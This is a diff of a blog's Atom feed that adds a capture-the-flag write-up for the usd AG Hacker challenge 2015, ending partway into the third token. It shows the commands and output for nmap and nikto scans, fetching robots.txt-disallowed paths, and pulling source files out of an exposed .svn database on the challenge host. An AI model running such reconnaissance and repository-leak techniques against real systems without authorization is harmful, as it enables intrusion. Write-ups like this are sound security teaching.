@@ -1,5 +1,1499 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>blog.dornea.nu</title><link href="http://blog.dornea.nu/" rel="alternate"></link><link href="http://blog.dornea.nu/feeds/victor-dorneanu.atom.xml" rel="self"></link><id>http://blog.dornea.nu/</id><updated>2015-02-26T00:00:00+01:00</updated><entry><title>The iOS 8.1.3 fiasco</title><link href="http://blog.dornea.nu/2015/02/26/the-ios-813-fiasco" rel="alternate"></link><updated>2015-02-26T00:00:00+01:00</updated><author><name>Victor Dorneanu</name></author><id>tag:blog.dornea.nu,2015-02-26:2015/02/26/the-ios-813-fiasco</id><summary type="html">&lt;p&gt;From time to time we all seem to ignore the "voice of reason" and tend to 
+<feed xmlns="http://www.w3.org/2005/Atom"><title>blog.dornea.nu</title><link href="http://blog.dornea.nu/" rel="alternate"></link><link href="http://blog.dornea.nu/feeds/victor-dorneanu.atom.xml" rel="self"></link><id>http://blog.dornea.nu/</id><updated>2015-03-18T00:00:00+01:00</updated><entry><title>usd AG Hacker challenge 2015 - Solutions</title><link href="http://blog.dornea.nu/2015/03/18/usd-ag-hacker-challenge-2015-solutions" rel="alternate"></link><updated>2015-03-18T00:00:00+01:00</updated><author><name>Victor Dorneanu</name></author><id>tag:blog.dornea.nu,2015-03-18:2015/03/18/usd-ag-hacker-challenge-2015-solutions</id><summary type="html">&lt;p&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;&lt;a href="https://www.usd.de"&gt;usd AG&lt;/a&gt; has announced a &lt;a href="https://www.usd.de/usd-hackertag-2015/"&gt;hacking challenge&lt;/a&gt; I have participated at. The target system was available at &lt;a href="http://82.195.79.41/"&gt;http://82.195.79.41/&lt;/a&gt;. Now let me sum up thg steps that have been required in order to get &lt;strong&gt;all&lt;/strong&gt; 6 tokens.&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[122]:
+&lt;/div&gt;
+
+&lt;div class="collapseheader box-flex1"&gt;&lt;span style=""&gt;Expand Code&lt;/span&gt;
+&lt;div class="input_area box-flex1" style="display:none"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pandas&lt;/span&gt; &lt;span class="kn"&gt;as&lt;/span&gt; &lt;span class="nn"&gt;pd&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sqlite3&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;binascii&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;h2 id="Scratch-the-surface"&gt;Scratch the surface&lt;a class="anchor-link" href="#Scratch-the-surface"&gt;&amp;#182;&lt;/a&gt;&lt;/h2&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;Let&amp;#39;s first conduct a &lt;strong&gt;nmap&lt;/strong&gt; scan to see which ports are open.&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[6]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;%%&lt;/span&gt;&lt;span class="k"&gt;bash&lt;/span&gt;
+&lt;span class="n"&gt;nmap&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;T4&lt;/span&gt; &lt;span class="mf"&gt;82.195&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;79.41&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
+&lt;pre class="ipynb"&gt;
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-03-18 20:57 CET
+Nmap scan report for 82.195.79.41
+Host is up (0.053s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+| http-robots.txt: 2 disallowed entries 
+|_/no/one/will/ever/know/ /~freddy/
+|_http-title: usd Hackertag Challenge Website
+7777/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 c6:62:55:12:32:5d:d9:15:bc:1e:51:77:0e:5a:96:ea (RSA)
+|_  256 22:f9:96:0c:2e:99:11:17:d0:a8:89:41:40:b6:3d:58 (ECDSA)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.70 seconds
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;So we have &lt;strong&gt;2 disallowed entries&lt;/strong&gt;. Let&amp;#39;s have a look:&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[9]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;!&lt;/span&gt;curl http://82.195.79.41//no/one/will/ever/know/
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
+&lt;pre class="ipynb"&gt;&amp;lt;!DOCTYPE HTML PUBLIC &amp;quot;-//W3C//DTD HTML 3.2 Final//EN&amp;quot;&amp;gt;
+&amp;lt;html&amp;gt;
+ &amp;lt;head&amp;gt;
+  &amp;lt;title&amp;gt;Index of /no/one/will/ever/know&amp;lt;/title&amp;gt;
+ &amp;lt;/head&amp;gt;
+ &amp;lt;body&amp;gt;
+&amp;lt;h1&amp;gt;Index of /no/one/will/ever/know&amp;lt;/h1&amp;gt;
+&amp;lt;table&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;&amp;lt;img src=&amp;quot;/icons/blank.gif&amp;quot; alt=&amp;quot;[ICO]&amp;quot;&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;a href=&amp;quot;?C=N;O=D&amp;quot;&amp;gt;Name&amp;lt;/a&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;a href=&amp;quot;?C=M;O=A&amp;quot;&amp;gt;Last modified&amp;lt;/a&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;a href=&amp;quot;?C=S;O=A&amp;quot;&amp;gt;Size&amp;lt;/a&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;a href=&amp;quot;?C=D;O=A&amp;quot;&amp;gt;Description&amp;lt;/a&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;th colspan=&amp;quot;5&amp;quot;&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;/tr&amp;gt;
+&amp;lt;tr&amp;gt;&amp;lt;td valign=&amp;quot;top&amp;quot;&amp;gt;&amp;lt;img src=&amp;quot;/icons/back.gif&amp;quot; alt=&amp;quot;[DIR]&amp;quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=&amp;quot;/no/one/will/ever/&amp;quot;&amp;gt;Parent Directory&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;amp;nbsp;&amp;lt;/td&amp;gt;&amp;lt;td align=&amp;quot;right&amp;quot;&amp;gt;  - &amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;amp;nbsp;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;
+&amp;lt;tr&amp;gt;&amp;lt;td valign=&amp;quot;top&amp;quot;&amp;gt;&amp;lt;img src=&amp;quot;/icons/text.gif&amp;quot; alt=&amp;quot;[TXT]&amp;quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=&amp;quot;secret.txt&amp;quot;&amp;gt;secret.txt&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td align=&amp;quot;right&amp;quot;&amp;gt;04-Mar-2015 15:23  &amp;lt;/td&amp;gt;&amp;lt;td align=&amp;quot;right&amp;quot;&amp;gt; 14 &amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;amp;nbsp;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;
+&amp;lt;tr&amp;gt;&amp;lt;th colspan=&amp;quot;5&amp;quot;&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;/tr&amp;gt;
+&amp;lt;/table&amp;gt;
+&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;h3 id="First-token"&gt;First token&lt;a class="anchor-link" href="#First-token"&gt;&amp;#182;&lt;/a&gt;&lt;/h3&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;If you pay attention you&amp;#39;ll see a &lt;strong&gt;secret.txt&lt;/strong&gt; in that directory:&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[8]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;!&lt;/span&gt;curl http://82.195.79.41//no/one/will/ever/know/secret.txt
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
+&lt;pre class="ipynb"&gt;Token: 928191
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;Bingo! Ok what about &lt;code&gt;~freddy&lt;/code&gt;:&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[14]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;!&lt;/span&gt;curl http://82.195.79.41/~freddy/
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
+&lt;pre class="ipynb"&gt;&amp;lt;!DOCTYPE HTML PUBLIC &amp;quot;-//W3C//DTD HTML 3.2 Final//EN&amp;quot;&amp;gt;
+&amp;lt;html&amp;gt;
+ &amp;lt;head&amp;gt;
+  &amp;lt;title&amp;gt;Index of /~freddy&amp;lt;/title&amp;gt;
+ &amp;lt;/head&amp;gt;
+ &amp;lt;body&amp;gt;
+&amp;lt;h1&amp;gt;Index of /~freddy&amp;lt;/h1&amp;gt;
+&amp;lt;table&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;&amp;lt;img src=&amp;quot;/icons/blank.gif&amp;quot; alt=&amp;quot;[ICO]&amp;quot;&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;a href=&amp;quot;?C=N;O=D&amp;quot;&amp;gt;Name&amp;lt;/a&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;a href=&amp;quot;?C=M;O=A&amp;quot;&amp;gt;Last modified&amp;lt;/a&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;a href=&amp;quot;?C=S;O=A&amp;quot;&amp;gt;Size&amp;lt;/a&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;a href=&amp;quot;?C=D;O=A&amp;quot;&amp;gt;Description&amp;lt;/a&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;th colspan=&amp;quot;5&amp;quot;&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;/tr&amp;gt;
+&amp;lt;tr&amp;gt;&amp;lt;td valign=&amp;quot;top&amp;quot;&amp;gt;&amp;lt;img src=&amp;quot;/icons/back.gif&amp;quot; alt=&amp;quot;[DIR]&amp;quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=&amp;quot;/&amp;quot;&amp;gt;Parent Directory&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;amp;nbsp;&amp;lt;/td&amp;gt;&amp;lt;td align=&amp;quot;right&amp;quot;&amp;gt;  - &amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;amp;nbsp;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;
+&amp;lt;tr&amp;gt;&amp;lt;th colspan=&amp;quot;5&amp;quot;&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;/tr&amp;gt;
+&amp;lt;/table&amp;gt;
+&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;OK, nothing to see here. &lt;strong&gt;BUT&lt;/strong&gt;: We keep in mind that &lt;strong&gt;freddy&lt;/strong&gt; is probably a local username.&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;h2 id="2nd-token"&gt;2nd token&lt;a class="anchor-link" href="#2nd-token"&gt;&amp;#182;&lt;/a&gt;&lt;/h2&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;The nmap results suggested that there is a HTTPD on port 80. Let&amp;#39;s see what &lt;strong&gt;nikto&lt;/strong&gt; finds:&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[16]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;!&lt;/span&gt;nikto -host http://82.195.79.41/ -C all
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
+&lt;pre class="ipynb"&gt;- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          82.195.79.41
++ Target Hostname:    82.195.79.41
++ Target Port:        80
++ Start Time:         2015-03-18 20:07:20 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache
++ Uncommon header &amp;apos;x-frame-options&amp;apos; found, with contents: sameorigin
++ Server leaks inodes via ETags, header found with file /robots.txt, inode: 131873, size: 68, mtime: 0x511175d9c5600
++ OSVDB-3268: /no/one/will/ever/know/: Directory indexing found.
++ File/dir &amp;apos;/no/one/will/ever/know/&amp;apos; in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ OSVDB-3268: /~freddy/: Directory indexing found.
++ File/dir &amp;apos;/~freddy/&amp;apos; in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ &amp;quot;robots.txt&amp;quot; contains 2 entries which should be manually viewed.
++ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
++ OSVDB-3092: /.svn/entries: Subversion Entries file may contain directory listing information.
++ OSVDB-3092: /.svn/wc.db: Subversion SQLite DB file may contain directory listing information.
++ 6545 items checked: 0 error(s) and 10 item(s) reported on remote host
++ End Time:           2015-03-18 20:19:17 (GMT1) (717 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;Besides thet &lt;em&gt;robots.txt&lt;/em&gt; entries &lt;code&gt;.svn&lt;/code&gt; looks very interesting. Let&amp;#39;s have a closer look:&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[6]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="n"&gt;con&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sqlite3&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;wc.db&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[8]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="n"&gt;pd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read_sql&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;SELECT local_relpath, checksum FROM NODES&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;con&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt output_prompt"&gt;
+    Out[8]:&lt;/div&gt;
+
+&lt;div class="output_html rendered_html output_subarea output_pyout"&gt;
+&lt;div style="max-height:1000px;max-width:1500px;overflow:auto;"&gt;
+&lt;table border="1" class="dataframe"&gt;
+  &lt;thead&gt;
+    &lt;tr style="text-align: right;"&gt;
+      &lt;th&gt;&lt;/th&gt;
+      &lt;th&gt;local_relpath&lt;/th&gt;
+      &lt;th&gt;checksum&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;th&gt;0&lt;/th&gt;
+      &lt;td&gt; download.php&lt;/td&gt;
+      &lt;td&gt; $sha1$71d7c4326159dff73464c31c8b8f3ee0aad3a805&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;th&gt;1&lt;/th&gt;
+      &lt;td&gt;             &lt;/td&gt;
+      &lt;td&gt;                                           None&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;Obviously there is a &lt;code&gt;download.php&lt;/code&gt; which we can retrieve from the SVN repo. Using the &lt;a href="http://pen-testing.sans.org/blog/2012/12/06/all-your-svn-are-belong-to-us"&gt;tutorial&lt;/a&gt; one can access the files inside the repository very easily:&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[9]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;!&lt;/span&gt;curl http://82.195.79.41/.svn/pristine/71/71d7c4326159dff73464c31c8b8f3ee0aad3a805.svn-base
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
+&lt;pre class="ipynb"&gt;&amp;lt;?php
+include &amp;quot;src/header.php&amp;quot;;
+// Todo: Challenge fuer Token 102342 bauen.
+echo &amp;apos;
+        &amp;lt;div id=&amp;quot;contentliquid&amp;quot;&amp;gt;&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt;
+           &amp;lt;p&amp;gt;Die folgende Datei steht zum Download bereit:&amp;lt;/p&amp;gt;
+	&amp;lt;ul&amp;gt;
+	&amp;lt;li&amp;gt;&amp;lt;a href=&amp;quot;dl/usd_Hackertag_2015.pdf&amp;quot;&amp;gt;usd Hackertag Poster (PDF-Format)&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
+	&amp;lt;/ul&amp;gt;
+&amp;apos;;
+
+echo &amp;quot;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;quot;;
+include &amp;quot;src/menu.php&amp;quot;;
+include &amp;quot;src/footer.php&amp;quot;;
+?&amp;gt;
+
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;There is this line:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Todo: Challenge fuer &lt;strong&gt;Token 102342&lt;/strong&gt; bauen.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;h2 id="3rd-Token"&gt;3rd Token&lt;a class="anchor-link" href="#3rd-Token"&gt;&amp;#182;&lt;/a&gt;&lt;/h2&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;Now let&amp;#39;s have a look at the PDF under &lt;a href="http://82.195.79.41/download.php"&gt;http://82.195.79.41/download.php&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src="http://dl.dornea.nu/img/2015/hackertag/9ca3a31f6400a2bf414ad3802d296cd3.png" alt="hackertag"&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[11]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;!&lt;/span&gt;file usd_Hackertag_2015.pdf
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
+&lt;pre class="ipynb"&gt;usd_Hackertag_2015.pdf: PDF document, version 1.3
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;When you look at it (PDF viewer) nothing special about it. &lt;/p&gt;
